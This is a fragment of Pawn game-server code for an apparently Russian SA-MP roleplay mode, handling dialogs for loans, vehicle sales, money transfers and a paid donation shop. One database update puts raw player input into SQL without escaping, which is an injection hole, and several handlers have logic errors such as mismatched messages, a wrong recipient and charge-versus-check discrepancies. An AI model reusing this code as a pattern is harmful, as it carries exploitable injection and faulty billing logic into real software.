					if(GetVehicleData(vehicleid, veh_slot) == 55)
						return SendClientMessage(playerid, C_RED, "Получить номера на грузовик нельзя");

					strmid(g_vehicle[vehicleid][veh_number], inputtext, 0, strlen(inputtext), 32);

					mysql_format(dbHandle, fmt_query, sizeof(fmt_query), "UPDATE ownable_cars SET number='%s' WHERE id=%d", inputtext, g_vehicle[vehicleid][veh_sql_id]);
					mysql_query(dbHandle, fmt_query, true);

					if(IsValidDynamic3DTextLabel(g_vehicle[vehicleid][veh_number_label]))
						DestroyDynamic3DTextLabel(g_vehicle[vehicleid][veh_number_label]);

					if(IsValidDynamic3DTextLabel(g_vehicle[vehicleid][veh_label]))
						DestroyDynamic3DTextLabel(g_vehicle[vehicleid][veh_label]);

					g_vehicle[vehicleid][veh_number_label] = CreateDynamic3DTextLabel(g_vehicle[vehicleid][veh_number], 0xFFFFFFFF, 0.0, 0.0, 0.0, 15.0, -1, _, vehicleid);
					Attach3DTextLabelToVehicle(g_vehicle[vehicleid][veh_number_label], vehicleid, 0.0, 0.0, 0.0);

					SendClientMessage(playerid, C_OSNOV, "Вы успешно приобрели VIP номер на свой автомобиль");

					PI[playerid][pCredits] -= 500;
					MysqlUpdatePlayerInt(playerid, "credits", PI[playerid][pCredits]);
				}
				else SendClientMessage(playerid, COLOR_RED, "Вы ввели некорректный номер.");
			}
		}
		case DIALOG_CREDIT:
		{
			if(response)
			{
				if(strval(inputtext) < 10000 || strval(inputtext) > 500000) return SendClientMessage(playerid, COLOR_GREY, "Количество от 10000000 до 50000000 рублей!");

				new percent = strval(inputtext) + getprocent(strval(inputtext), 20);

				printf("20% от %d - %d", strval(inputtext), percent);

				new fmt_dialog[330];

				format
				(
					fmt_dialog, sizeof fmt_dialog,
					"{ffffff}Вы действительно хотите взять кредит на {ffcc00}%d рублей\n"\
					"{ffffff}Ровно через 7 дней на Вашем банковском счёте должно быть {ffcc00}%d рублей,\n"\
					"{ffffff}В противном случаем у Вас отнимут: дом, квартиру, машину\n"\
					"{ffffff}На срок кредита Вам будет запрещена продажа имущества\n"\
					"{ffffff}(дом, квартира, машина)",
					strval(inputtext), percent
				);

				ShowPlayerDialog
				(
					playerid, DIALOG_CREDIT_TAKE, DIALOG_STYLE_MSGBOX,
					"{ffcc00}Кредит",
					fmt_dialog,
					"Взять", "Отмена"
				);

				SetPVarInt(playerid, "credit_money", strval(inputtext));
				SetPVarInt(playerid, "credit_money_percent", percent);
			}
		}
		case DIALOG_CREDIT_TAKE:
		{
			if(response)
			{
				SendClientMessage(playerid, 0xFFCC00AA, "Вы успешно взяли кредит.");
				SendClientMessage(playerid, 0xFFCC00AA, "Теперь Вам запрещено продавать имущество.");

				new money_percent = GetPVarInt(playerid, "credit_money_percent");

				PI[playerid][pCredit] = gettime() + 86400*7;
				PI[playerid][pCreditMoney] = money_percent;

				MysqlUpdatePlayerInt(playerid, "credit", PI[playerid][pCredit]);
				MysqlUpdatePlayerInt(playerid, "creditmoney", PI[playerid][pCreditMoney]);

				GiveMoney(playerid, GetPVarInt(playerid, "credit_money"));
			}
		}
		case DIALOG_AREND_BALL:
		{
			if(response)
			{
				if(PI[playerid][pCash] < 50000)
					return SendMess(playerid, MSG_NOT_MONEY);

				GiveMoney(playerid, -50000);

				SendClientMessage(playerid, C_OSNOV, "Вы успешно оплатили полёт на воздушном шаре.");
				SendClientMessage(playerid, C_OSNOV, "Через 20 секунд шар взлетит, залезьте в него");
				SendClientMessage(playerid, C_OSNOV, "Остановка в г.Южный будет длиться 20 секунд");

				g_arend_ball_status = true;

				SetTimer("StartBall", 20_000, false);

				//MoveDynamicObject(g_arend_ball_object, 488.3500, 1746.0500, 58.9357, 2.0);
			}
		}
		case DIALOG_SELL_CAR:
		{
			if(response)
			{
				new car_price = GetPVarInt(playerid, "sell_car_cost"), percent = GetPVarInt(playerid, "sell_car_percent");

				if(GetMoney(playerid) + (car_price - percent) > 1000000000)
					return SendClientMessage(playerid, C_RED, "Больше 1000000000 рублей запрещено иметь на руках");

				new vehicleid = g_player_car[playerid];

				if(vehicleid == INVALID_VEHICLE_ID) return 1;

				new bool: car = false;

				for(new idx; idx < MAX_PLAYER_OWNABLE_CARS; idx ++)
				{
					if(PI[playerid][P_OWNABLE_CAR][idx] == vehicleid) car = true;
				}

				if(car == false) return SendClientMessage(playerid, C_RED, "Произошла ошибка");

				STRING_GLOBAL[0] = EOS;
				format(STRING_GLOBAL, sizeof STRING_GLOBAL, "DELETE FROM ownable_cars WHERE `id` = '%d'", g_vehicle[vehicleid][veh_sql_id]);
				mysql_query(dbHandle, STRING_GLOBAL);
				SendClientMessage(playerid, 0x3399FFFF, "Вы продали личный транспорт");

				STRING_GLOBAL[0] = EOS;
				format(STRING_GLOBAL, sizeof STRING_GLOBAL, "Налоговый сбор составляет 20 процентов от его стоимости {FF9900}(%d руб)", car_price);
				SendClientMessage(playerid, -1, STRING_GLOBAL);

				STRING_GLOBAL[0] = EOS;
				format(STRING_GLOBAL, sizeof STRING_GLOBAL, "На счет было переведено {FFFF00}%d руб", car_price - percent);
				SendClientMessage(playerid, 0x66CC00FF, STRING_GLOBAL);

				STRING_GLOBAL[0] = EOS;
				format(STRING_GLOBAL, sizeof STRING_GLOBAL, "~g~+%d rub", car_price - percent);
				GameTextForPlayer(playerid, STRING_GLOBAL, 4000, 1);

				GiveMoney(playerid, car_price - percent);

				SetVehicleData(vehicleid, veh_owner_id, INVALID_PLAYER_ID);

				if(IsValidDynamic3DTextLabel(g_vehicle[vehicleid][veh_number_label]))
					DestroyDynamic3DTextLabel(g_vehicle[vehicleid][veh_number_label]);

				if(IsValidDynamic3DTextLabel(g_vehicle[vehicleid][veh_label]))
					DestroyDynamic3DTextLabel(g_vehicle[vehicleid][veh_label]);

				PI[playerid][P_OWNABLE_CAR][GetVehicleData(vehicleid, veh_slot)-1] = INVALID_VEHICLE_ID;

				ClearVehicleData(vehicleid);

				DestroyVehicle(vehicleid);
			}
		}
		case DIALOG_SELL_COPTER:
		{
			if(response)
			{
				new vehicleid = PI[playerid][PlayerCopterID];

				if(vehicleid == INVALID_VEHICLE_ID) return 1;

				DestroyVehicle(vehicleid);

				new fmt_msg[128];

				format(fmt_msg, sizeof fmt_msg, "DELETE FROM copters WHERE owner_name='%s'", GetName(playerid));
				mysql_query(dbHandle, fmt_msg);

				new car_price = GetPVarInt(playerid, "sell_car_cost"), percent = GetPVarInt(playerid, "sell_car_percent");

				SendClientMessage(playerid, 0x3399FFFF, "Вы продали личный вертолет");

				format(fmt_msg, sizeof fmt_msg, "Налоговый сбор составляет 20 процентов от его стоимости {FF9900}(%d руб)", car_price);
				SendClientMessage(playerid, -1, fmt_msg);

				format(fmt_msg, sizeof fmt_msg, "На счет было переведено {FFFF00}%d руб", car_price - percent);
				SendClientMessage(playerid, 0x66CC00FF, fmt_msg);

				format(fmt_msg, sizeof fmt_msg, "~g~+%d rub", car_price - percent);
				GameTextForPlayer(playerid, fmt_msg, 4000, 1);

				GiveMoney(playerid, car_price - percent);

				PI[playerid][PlayerCopterID] = INVALID_VEHICLE_ID;
			}
		}
		case DIALOG_ROUTE_BUS:
		{
			if(response)
			{
				for(new i = 0; i < sizeof bus; i ++) PlayerTextDrawHide(playerid, bus[i][playerid]);
				for(new i = 0; i < sizeof bus_time; i ++) PlayerTextDrawShow(playerid, bus_time[i][playerid]);

				new id_bus = PI[playerid][pBusID],
					time_ = g_bus[id_bus][bus_time_minute];

				player_bus_timer[playerid] = SetTimerEx("PlayerBusTimer", 1000, true, "d", playerid);

				PI[playerid][pBusTimer] = time_;

				SetPlayerPosInBus(playerid);

				new fare = 200;

				GiveMoney(playerid, -fare);
			}
			if(!response)
			{
				DeletePVar(playerid, "bus_route");
				DeletePVar(playerid, "stop_bus");
				for(new i = 0; i < sizeof bus; i ++) PlayerTextDrawHide(playerid, bus[i][playerid]);
				PI[playerid][pBusTimer] =
				PI[playerid][pBusID] = -1;
			}
		}
		case DIALOG_INTERACTION_MONEY:
		{
			if(response)
			{
				if(PI[playerid][pInteractionPlayer] == -1)
					return 1;

				new money = strval(inputtext);

				if(!IsNumeric(inputtext))
					return ShowPlayerDialog(playerid, DIALOG_INTERACTION_MONEY, DIALOG_STYLE_INPUT,	"{ffcc00}Передать деньги", "{ffffff}Введите количество денег, которых хотите передать игроку:", "Передать", "Отмена");

				new to_player = GetPVarInt(playerid, "to_player_interaction");

				if(GetMoney(playerid) < money)
					return SendMess(playerid, MSG_NOT_MONEY);

				if(money < 1 || money > 10000)
					return SendClientMessage(playerid, COLOR_GREY, "Игроки могут передавать только по 10.000р");

				if(PI[playerid][pLevel] < 8)
					return SendClientMessage(playerid, C_RED, "Передавать деньги можно с 8 уровня");

				if(GetPVarInt(playerid, "payer") > gettime()) return SendClientMessage(playerid, COLOR_GREY, "Передавать деньги можно раз в минуту");
				else if(!ProxDetectorS(3.0, playerid, to_player)) return SendClientMessage(playerid, COLOR_GREY, "Игрок слишком далеко!");

				GiveMoney(playerid, -money);
				GiveMoney(to_player, money);

				new string[128];
				SendMes(money, COLOR_GREY, "Игрок %s передал вам %dр", GetName(playerid), money);
				SendMes(playerid, COLOR_GREY, "Вы передали %dр игроку %s", money, GetName(to_player));
				if(PI[playerid][pSex] == 1) format(string, sizeof(string), "достал деньги из кармана и передал их %s", GetName(to_player));
				else format(string, sizeof(string), "достала деньги из кармана и передала их %s", GetName(to_player));
				MeAction(playerid, string);

				format(string, sizeof(string), "{FF6600}-%d", money);
				MeAction(playerid, string);
				format(string, sizeof(string), "{1D99D4}+%d", money);
				MeAction(to_player, string);

				ApplyAnimation(playerid, "DEALER", "shop_pay", 4.1, 0, 1, 1, 0, 0, 1);
				if(!PI[playerid][pAdmin])
				{
					SetPVarInt(playerid, "payer", gettime()+60);
				}
			}
		}
		case DIALOG_INTERACTION_SELL_CAR:
		{
			if(response)
			{
				if(PI[playerid][pInteractionPlayer] == -1)
					return 1;

				if(g_player_car[playerid] == INVALID_VEHICLE_ID)
					return SendClientMessage(playerid, C_RED, "Вы должны находиться в автомобиле");

				new money = strval(inputtext);

				if(!IsNumeric(inputtext))
					return ShowPlayerDialog(playerid, DIALOG_INTERACTION_SELL_CAR, DIALOG_STYLE_MSGBOX, "{ffcc00}Продажа личного ТС", "{ffffff}Введите сумму, за которую хотите продать своё ТС:", "Продать", "Отмена");

				SendPlayerProposition(playerid, PI[playerid][pInteractionPlayer], PROPOSITION_TYPE_SELL_CAR, money);
			}
		}
		case DIALOG_INTERACTION_SELL_BIZ:
		{
			if(response)
			{
				new money = strval(inputtext);

				if(money < 0)
					return SendClientMessage(playerid, -1, "Неверная цена");

				if(!IsNumeric(inputtext))
					ShowPlayerDialog(playerid, DIALOG_INTERACTION_SELL_BIZ, DIALOG_STYLE_INPUT, "{ffcc00}Продажа бизнеса", "{ffffff}Введите сумму, за которую хотите продать свой бизнес:", "Продать", "Отмена");

				SendPlayerProposition(playerid, PI[playerid][pInteractionPlayer], PROPOSITION_TYPE_SELL_BUSINESS, money);
			}
		}
		case D_DONATE+1:
  		{
  		    if(!response) return 1;
	  		switch(listitem)
			{
				case 0:
				{
				    if(doubling_donate)
                    	ShowPlayerDialog(playerid, D_DONATE+2, DIALOG_STYLE_INPUT, "{FFCC00}Получение игровой валюты", "{FFFFFF}Введите количество кредитов, которые хотите перевести в игровые деньги\nКурс обмена: 1 RUB - 1500 рублей {63BD4E}(с учётом акции)", "Далее", "Назад");
                    else
                    	ShowPlayerDialog(playerid, D_DONATE+2, DIALOG_STYLE_INPUT, "{FFCC00}Получение игровой валюты", "{FFFFFF}Введите количество кредитов, которые хотите перевести в игровые деньги\nКурс обмена: 1 RUB - 750 рублей", "Далее", "Назад");
				}
				case 1:
				{
					if(!doubling_donate)
					{
						ShowPlayerDialog(playerid, D_DONATE+3, DIALOG_STYLE_LIST, "{FFCC00}Игровые пакеты",
			   			"{FFCC00}1. {99CC00}Набор 'Для старта' 80.000 рублей\t\t\t{FFCC00}100 RUB\n\
						{FFCC00}2. {99CC00}Набор 'Успешный' 300.000 рубле\t\t\t{FFCC00}350 RUB\n\
						{FFCC00}3. {99CC00}Набор 'Бандит' 600.000 рублей\t\t\t{FFCC00}600 RUB\n\
						{FFCC00}4. {99CC00}Набор 'Без границ' 2.200.000 рублей\t\t{FFCC00}2200 RUB\n\
						{FFCC00}5. {99CC00}Набор 'Заряженный' 5.000.000 рублей\t\t{FFCC00}5500 RUB", "Далее", "Отмена");
					}
					else
					{
						ShowPlayerDialog(playerid, D_DONATE+3, DIALOG_STYLE_LIST, "{FFCC00}Игровые пакеты",
			   			"{FFCC00}1. {99CC00}Набор 'Для старта' 160.000 рублей(Х2)\t\t\t{FFCC00}100 RUB\n\
						{FFCC00}2. {99CC00}Набор 'Успешный' 600.000 рубле(Х2)\t\t\t{FFCC00}350 RUB\n\
						{FFCC00}3. {99CC00}Набор 'Бандит' 1.200.000 рублей(Х2)\t\t\t{FFCC00}600 RUB\n\
						{FFCC00}4. {99CC00}Набор 'Без границ' 4.400.000 рублей(Х2)\t\t{FFCC00}2200 RUB\n\
						{FFCC00}5. {99CC00}Набор 'Заряженный' 10.000.000 рублей(Х2)\t\t{FFCC00}5500 RUB", "Далее", "Отмена");
					}
				}
				case 2:
				{
					new Cache: result,
						rows;
					new strtime[64],Year, Month, Day,hour,minuite,second;
					gettime(hour,minuite,second), getdate(Year, Month, Day);

					STRING_GLOBAL[0] = EOS;
					format(STRING_GLOBAL, sizeof STRING_GLOBAL, "SELECT * FROM `freekassa_payments` WHERE `account` = '%s' AND `status` = '1'", GetName(playerid));
					result = mysql_query(dbHandle, STRING_GLOBAL);

					rows = cache_num_rows();

					new count = cache_get_field_content_int(0, "sum"),
						id = cache_get_field_content_int(0, "newid");

					if(!rows) {
		   				SendClientMessage(playerid, C_RED, "Пополнений на Ваш счет не обнаружено"), cache_delete(result);
					    ShowDonateDialogMenu(playerid);
					    return 1;
		   			}

					PI[playerid][pCredits] += count;
					PI[playerid][pTotalCredits] += count;

					MysqlUpdatePlayerInt(playerid, "credits", PI[playerid][pCredits]);
					MysqlUpdatePlayerInt(playerid, "totalcredits", PI[playerid][pTotalCredits]);

					STRING_GLOBAL[0] = EOS;
					format(STRING_GLOBAL, sizeof STRING_GLOBAL, "На Ваш аккаунт было пополнено %d RUB. Всего RUB: %d", count, PI[playerid][pCredits]);
					SendClientMessage(playerid, C_BLUE, STRING_GLOBAL);

		            format(strtime,sizeof(strtime),"%02d-%02d-%02d %02d:%02d:%02d",Year, Month, Day,hour,minuite,second);
					format(STRING_GLOBAL, sizeof STRING_GLOBAL, "UPDATE `freekassa_payments` SET `status` = '2', `dateComplete` = '%s' WHERE `newid` = '%d'", strtime, id);
					mysql_tquery(dbHandle, STRING_GLOBAL);
					cache_delete(result);
				}
				case 4:
				{
					STRING_GLOBAL[0] = EOS;
					strcat(STRING_GLOBAL, "{FFFF00}Преимущества VIP статуса:\n{FFFFFF}");
					strcat(STRING_GLOBAL, "1) Ускоренное лечение в больнице\n");
					strcat(STRING_GLOBAL, "2) + 3 доп.слота для автомобиля\n");
					strcat(STRING_GLOBAL, "3) Возможность покинуть организацию самому (/leave)\n");
					strcat(STRING_GLOBAL, "4) Каждую 4-ую зарплату +1 респект\n");
					strcat(STRING_GLOBAL, "5) Прокачка скиллов в 2 раза быстрей\n");
					strcat(STRING_GLOBAL, "6) Проявление чувства голода у персонажа в 2 раза реже\n");
					strcat(STRING_GLOBAL, "7) Уменьшенное время на отправку вопроса/репорта\n");
					strcat(STRING_GLOBAL, "8) Возможность уволиться с работы не на месте устройства (/quitjob)\n");
					strcat(STRING_GLOBAL, "{FFFF00}Примечание:\n{FFFFFF}");
					strcat(STRING_GLOBAL, "- VIP статус выдаётся на 30 дней");
					ShowPlayerDialog(playerid, D_JOB+200, DIALOG_STYLE_MSGBOX, "VIP статус", STRING_GLOBAL, "Купить", "Назад");
				}
				case 5:
				{
					STRING_GLOBAL[0] = EOS;
					strcat(STRING_GLOBAL, "{FFFF00}Преимущества VIP статуса:\n{FFFFFF}");
					strcat(STRING_GLOBAL, "1) Ускоренное лечение в больнице\n");
					strcat(STRING_GLOBAL, "2) + 3 доп.слота для автомобиля\n");
					strcat(STRING_GLOBAL, "3) Возможность покинуть организацию самому (/leave)\n");
					strcat(STRING_GLOBAL, "4) Каждую 4-ую зарплату +1 респект\n");
					strcat(STRING_GLOBAL, "5) Прокачка скиллов в 2 раза быстрей\n");
					strcat(STRING_GLOBAL, "6) Проявление чувства голода у персонажа в 2 раза реже\n");
					strcat(STRING_GLOBAL, "7) Уменьшенное время на отправку вопроса/репорта\n");
					strcat(STRING_GLOBAL, "8) Возможность уволиться с работы не на месте устройства (/quitjob)\n");
					strcat(STRING_GLOBAL, "{FFFF00}Примечание:\n{FFFFFF}");
					strcat(STRING_GLOBAL, "- VIP статус выдаётся на 60 дней");
					ShowPlayerDialog(playerid, D_JOB+199, DIALOG_STYLE_MSGBOX, "VIP статус", STRING_GLOBAL, "Купить", "Назад");
				}
				case 6:
				{
					STRING_GLOBAL[0] = EOS;
					strcat(STRING_GLOBAL, "{FFFF00}Преимущества VIP статуса:\n{FFFFFF}");
					strcat(STRING_GLOBAL, "1) Ускоренное лечение в больнице\n");
					strcat(STRING_GLOBAL, "2) + 3 доп.слота для автомобиля\n");
					strcat(STRING_GLOBAL, "3) Возможность покинуть организацию самому (/leave)\n");
					strcat(STRING_GLOBAL, "4) Каждую 4-ую зарплату +1 респект\n");
					strcat(STRING_GLOBAL, "5) Прокачка скиллов в 2 раза быстрей\n");
					strcat(STRING_GLOBAL, "6) Проявление чувства голода у персонажа в 2 раза реже\n");
					strcat(STRING_GLOBAL, "7) Уменьшенное время на отправку вопроса/репорта\n");
					strcat(STRING_GLOBAL, "8) Возможность уволиться с работы не на месте устройства (/quitjob)\n");
					strcat(STRING_GLOBAL, "{FFFF00}Примечание:\n{FFFFFF}");
					strcat(STRING_GLOBAL, "- VIP статус выдаётся на 60 дней");
					ShowPlayerDialog(playerid, D_JOB+197, DIALOG_STYLE_MSGBOX, "VIP статус", STRING_GLOBAL, "Купить", "Назад");
				}
				case 8:
				{
   					if(PI[playerid][pCredits] < 70) return SendClientMessage(playerid, COLOR_RED, "Недостаточно RUB!");
   	 				ShowPlayerDialog(playerid, D_JOB+179, 1, "{FFCC00}Смена ника", "{FFFFFF}Введите будущий ник:", "Принять", "Назад");
				}
				case 9:
				{
					if(PI[playerid][pWarn] == 0)
						return SendClientMessage(playerid, C_RED, "Вы не имеете предупреждений");

					if(PI[playerid][pCredits] < 249)
						return SendClientMessage(playerid, COLOR_GREY, "Недостаточно кредитов!");

					PI[playerid][pCredits] -= 249;
					PI[playerid][pTotalCredits] -= 249;
	                PI[playerid][pWarn]--;

					MysqlUpdatePlayerInt(playerid, "totalcredits", PI[playerid][pTotalCredits]);
					MysqlUpdatePlayerInt(playerid, "credits", PI[playerid][pCredits]);
					MysqlUpdatePlayerInt(playerid, "warn", PI[playerid][pWarn]);

					SendClientMessage(playerid, C_BLUE, "Вы успешно сняли одно предупреждение");
				}
				case 10:
				{
					if(PI[playerid][pZakon] == 100)
						return SendClientMessage(playerid, C_RED, "Вы не имеете предупреждений");

					if(PI[playerid][pCredits] < 5)
						return SendClientMessage(playerid, COLOR_GREY, "Недостаточно кредитов!");

					PI[playerid][pCredits] -= 5;
					PI[playerid][pZakon] += 5;

					MysqlUpdatePlayerInt(playerid, "credits", PI[playerid][pCredits]);
					MysqlUpdatePlayerInt(playerid, "zakon", PI[playerid][pZakon]);

					SendClientMessage(playerid, C_BLUE, "Вы успешно пополнили законопослушность на 5 единиц!");
				}
				case 12:
				{
					if(PI[playerid][pCredits] < 150) return SendClientMessage(playerid, COLOR_GREY, "Недостаточно кредитов!");

					if(PI[playerid][pVoennik] == 0)
					{
						PI[playerid][pVoennik] = 1;

						PI[playerid][pCredits] -= 150;

						MysqlUpdatePlayerInt(playerid, "credits", PI[playerid][pCredits]);
						MysqlUpdatePlayerInt(playerid, "Voennik", PI[playerid][pVoennik]);

						return SendClientMessage(playerid, COLOR_YELLOW, "Вы успешно купили военный билет!");
					}
					else SendClientMessage(playerid, COLOR_GREY, "У Вас уже есть военный билет.");
				}
				case 13:
				{
   					if(PI[playerid][pCredits] < 399) return SendClientMessage(playerid, COLOR_GREY, "Недостаточно кредитов!");
			        PI[playerid][pCredits] -= 399;
					MysqlUpdatePlayerInt(playerid, "credits", PI[playerid][pCredits]);
			        for(new i; i < 4; i++) g_player_skills[playerid][S_LICS][i] = 1;

					SavePlayerSkills(playerid);
					SendClientMessage(playerid, COLOR_LIME, "Вы приобрели все лицензии!");

				}
				case 14:
				{
			        if(PI[playerid][pCredits] < 649)
						return SendClientMessage(playerid, COLOR_GREY, "Недостаточно кредитов!");

			        PI[playerid][pCredits] -= 649;

					MysqlUpdatePlayerInt(playerid, "credits", PI[playerid][pCredits]);

			        for(new i; i < 8; i++)
						g_player_skills[playerid][S_GUN][i] = 100;

					SendClientMessage(playerid, COLOR_LIME, "Вы приобрели все навыки владения оружием!");

					SavePlayerSkills(playerid);
					SetPlayerSkills(playerid);
				}
			}
   		}
   		case D_DONATE+2:
		{
			if(!response) return callcmd::donate(playerid);
		    if(strval(inputtext) < 1 || strval(inputtext) > 5000) return SendClientMessage(playerid, COLOR_RED, "Количество от 1 до 5000 RUB!");
			if(PI[playerid][pCredits] < strval(inputtext)) return SendClientMessage(playerid, COLOR_RED, "Недостаточно RUB!");
			PI[playerid][pCredits] -= strval(inputtext);
			MysqlUpdatePlayerInt(playerid, "credits", PI[playerid][pCredits]);
			new string[128];
			if(!doubling_donate)
			{
				format(string, sizeof(string), "Вы купили %i рублей за %d кредитов.", strval(inputtext)*750, strval(inputtext));
				SendClientMessage(playerid, COLOR_LIME, string);
				format(string, sizeof(string), "+%i рублей", strval(inputtext)*750);
				GameTextForPlayer(playerid, string, 3000, 1);
				TransferMoney(-1,playerid,strval(inputtext)*750);
			}
			else
			{
			    format(string, sizeof(string), "Вы купили %i рублей за %d кредитов.", strval(inputtext)*1500, strval(inputtext));
				SendClientMessage(playerid, COLOR_LIME, string);
				format(string, sizeof(string), "+%i рублей", strval(inputtext)*1500);
				GameTextForPlayer(playerid, string, 3000, 1);
				TransferMoney(-1,playerid,strval(inputtext)*1500);
			}
		}
		case D_DONATE+3:
		{
			if(!response) return 1;
			switch(listitem)
			{
              	case 0:
			    {
					if(!doubling_donate)
					{
					    if(PI[playerid][pCredits] < 100) return SendClientMessage(playerid, COLOR_RED, "Недостаточно RUB!");
						SendClientMessage(playerid, COLOR_LIME, "Вы успешно приобрели набор 'Для старта' и получили 80.000 рублей");
						PI[playerid][pCredits] -= 100;
						MysqlUpdatePlayerInt(playerid, "credits", PI[playerid][pCredits]);
						GiveMoney(playerid, 80000, "Пак");
					}
					else
					{
					    if(PI[playerid][pCredits] < 100) return SendClientMessage(playerid, COLOR_RED, "Недостаточно RUB!");
						SendClientMessage(playerid, COLOR_LIME, "Вы успешно приобрели набор 'Для старта' и получили 160.000 рублей");
						PI[playerid][pCredits] -= 100;
						MysqlUpdatePlayerInt(playerid, "credits", PI[playerid][pCredits]);
						GiveMoney(playerid, 160000, "Пак");
					}
			    }
              	case 1:
			    {
					if(!doubling_donate)
					{
					    if(PI[playerid][pCredits] < 350) return SendClientMessage(playerid, COLOR_RED, "Недостаточно RUB!");
						SendClientMessage(playerid, COLOR_LIME, "Вы успешно приобрели набор 'Для старта' и получили 300.000 рублей");
						PI[playerid][pCredits] -= 350;
						MysqlUpdatePlayerInt(playerid, "credits", PI[playerid][pCredits]);
						GiveMoney(playerid, 300000, "Пак");

					}
					else
					{
					    if(PI[playerid][pCredits] < 350) return SendClientMessage(playerid, COLOR_RED, "Недостаточно RUB!");
						SendClientMessage(playerid, COLOR_LIME, "Вы успешно приобрели набор 'Для старта' и получили 600.000 рублей");
						PI[playerid][pCredits] -= 350;
						MysqlUpdatePlayerInt(playerid, "credits", PI[playerid][pCredits]);
						GiveMoney(playerid, 600000, "Пак");
					}
			    }
              	case 2:
			    {
					if(!doubling_donate)
					{
					    if(PI[playerid][pCredits] < 600) return SendClientMessage(playerid, COLOR_RED, "Недостаточно RUB!");
						SendClientMessage(playerid, COLOR_LIME, "Вы успешно приобрели набор 'Для старта' и получили 600.000 рублей");
						PI[playerid][pCredits] -= 600;
						MysqlUpdatePlayerInt(playerid, "credits", PI[playerid][pCredits]);
						GiveMoney(playerid, 600000, "Пак");
					}
					else
					{
					    if(PI[playerid][pCredits] < 600) return SendClientMessage(playerid, COLOR_RED, "Недостаточно RUB!");
						SendClientMessage(playerid, COLOR_LIME, "Вы успешно приобрели набор 'Для старта' и получили 1.200.000 рублей");
						PI[playerid][pCredits] -= 600;
						MysqlUpdatePlayerInt(playerid, "credits", PI[playerid][pCredits]);
						GiveMoney(playerid, 1200000, "Пак");
					}
			    }
              	case 3:
			    {
					if(!doubling_donate)
					{
					    if(PI[playerid][pCredits] < 2200) return SendClientMessage(playerid, COLOR_RED, "Недостаточно RUB!");
						SendClientMessage(playerid, COLOR_LIME, "Вы успешно приобрели набор 'Для старта' и получили 2.000.000 рублей");
						PI[playerid][pCredits] -= 2200;
						MysqlUpdatePlayerInt(playerid, "credits", PI[playerid][pCredits]);
						GiveMoney(playerid, 2000000, "Пак");
					}
					else
					{
					    if(PI[playerid][pCredits] < 2200) return SendClientMessage(playerid, COLOR_RED, "Недостаточно RUB!");
						SendClientMessage(playerid, COLOR_LIME, "Вы успешно приобрели набор 'Для старта' и получили 4.000.000 рублей");
						PI[playerid][pCredits] -= 2200;
						MysqlUpdatePlayerInt(playerid, "credits", PI[playerid][pCredits]);
						GiveMoney(playerid, 4000000, "Пак");
					}
			    }
      			case 4:
			    {
					if(!doubling_donate)
					{
					    if(PI[playerid][pCredits] < 5000) return SendClientMessage(playerid, COLOR_RED, "Недостаточно RUB!");
						SendClientMessage(playerid, COLOR_LIME, "Вы успешно приобрели набор 'Для старта' и получили 5.000.000 рублей");
						PI[playerid][pCredits] -= 5500;
						MysqlUpdatePlayerInt(playerid, "credits", PI[playerid][pCredits]);
						GiveMoney(playerid, 5000000, "Пак");

					}
					else
					{
					    if(PI[playerid][pCredits] < 5500) return SendClientMessage(playerid, COLOR_RED, "Недостаточно RUB!");
						SendClientMessage(playerid, COLOR_LIME, "Вы успешно приобрели набор 'Для старта' и получили 10.000.000 рублей");
						PI[playerid][pCredits] -= 5500;
						MysqlUpdatePlayerInt(playerid, "credits", PI[playerid][pCredits]);
						GiveMoney(playerid, 10000000, "Пак");
					}
			    }
			}
		}
		case D_DONATE+4:
		{
			if(!response) return 1;
			switch(listitem)
			{
              	case 0:
			    {
			        if(PI[playerid][pCredits] < 400)
						return SendClientMessage(playerid, COLOR_GREY, "Недостаточно кредитов!");

			        PI[playerid][pCredits] -= 400;

					MysqlUpdatePlayerInt(playerid, "credits", PI[playerid][pCredits]);

			        for(new i; i < 8; i++)
						g_player_skills[playerid][S_GUN][i] = 100;

					SendClientMessage(playerid, COLOR_LIME, "Вы приобрели все навыки владения оружием!");

					SavePlayerSkills(playerid);
					SetPlayerSkills(playerid);
			    }
				case 1:
			    {
			    	if(PI[playerid][pCredits] < 400) return SendClientMessage(playerid, COLOR_GREY, "Недостаточно кредитов!");
			        PI[playerid][pCredits] -= 400;
					MysqlUpdatePlayerInt(playerid, "credits", PI[playerid][pCredits]);
			        for(new i; i < 4; i++) g_player_skills[playerid][S_LICS][i] = 1;

					SavePlayerSkills(playerid);
					SendClientMessage(playerid, COLOR_LIME, "Вы приобрели все лицензии!");
			    }
			    case 2:
			    {
			        if(PI[playerid][pCredits] < 300) return SendClientMessage(playerid, COLOR_GREY, "Недостаточно кредитов!");
			        PI[playerid][pCredits] -= 300;
			        PI[playerid][pSportExp] = 6000;
			        PI[playerid][pFightStyle] = 7;
					MysqlUpdatePlayerInt(playerid, "credits", PI[playerid][pCredits]);

			        STRING_GLOBAL[0] = EOS;
					format(STRING_GLOBAL, sizeof(STRING_GLOBAL), "UPDATE "T_ACCOUNTS" SET sportexp=%i,fstyle=%i WHERE name='%s'",
					PI[playerid][pSportExp], PI[playerid][pFightStyle], GetName(playerid));
					mysql_tquery(dbHandle, STRING_GLOBAL, "", "");
					SendClientMessage(playerid, COLOR_LIME, "Вы приобрели все навыки стиля боя!");
				}
				case 3:
			    {
			        if(PI[playerid][pCredits] < 150) return SendClientMessage(playerid, COLOR_GREY, "Недостаточно кредитов!");
			        PI[playerid][pCredits] -= 150;
			        PI[playerid][pSprunk] += 1000;
					SendClientMessage(playerid, COLOR_LIME, "Вы увеличили вместимость инвентаря (+1 кг).");
					MysqlUpdatePlayerInt(playerid, "credits", PI[playerid][pCredits]);
					MysqlUpdatePlayerInt(playerid, "sprunk", PI[playerid][pSprunk]);
				}
			}
		}
		case 4814:
        {
        	new veh = GetPlayerVehicleID(playerid);
        	if(!response) return 1;
            switch(listitem)
            {
                case 0:
                {
                	if(GetPVarInt(playerid, "Bonnet") == 0)
                 	{
                  		GetVehicleParamsEx(veh,engine,lights,alarm,doors,bonnet,boot,objective);
                    	SetVehicleParamsEx(veh,engine,lights,alarm,doors,VEHICLE_PARAMS_ON,boot,objective);
                     	SetPVarInt(playerid, "Bonnet", 1);
                    }
                    else if(GetPVarInt(playerid, "Bonnet") == 1)
                    {
                    	GetVehicleParamsEx(veh,engine,lights,alarm,doors,bonnet,boot,objective);
                     	SetVehicleParamsEx(veh,engine,lights,alarm,doors,VEHICLE_PARAMS_OFF,boot,objective);
                      	SetPVarInt(playerid, "Bonnet", 0);
                    }
                }
                case 1:
               	{
                 	if(GetPVarInt(playerid, "Boot") == 0)
                  	{
